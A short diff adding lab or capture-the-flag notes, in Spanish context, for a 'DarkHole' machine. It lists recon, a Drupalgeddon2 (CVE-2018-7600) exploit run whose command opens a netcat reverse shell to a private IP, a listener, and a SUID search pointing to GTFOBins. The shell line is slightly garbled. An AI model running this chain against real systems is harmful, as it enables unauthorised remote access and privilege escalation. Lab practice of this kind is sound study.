@@ -367,6 +367,14 @@ http://192.168.190.130 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESE
 - Cookies: Se está utilizando PHPSESSID para la gestión de sesiones.
 - Título de la Página: "DarkHole"
 
+http://172.168.2.4/robots.txt
+searchsploit Drupal 7
+https://www.exploit-db.com/
+github CVE-2018-7600
+python2 drupalgeddon2.py -h http://172.168.2.4 -c "nohup nc -e /bin/bash 172.168.2.5 5 9000 &"
+nc -lnvp 9000
+find / -perm -u=s 
+gtfobins
 
 
 
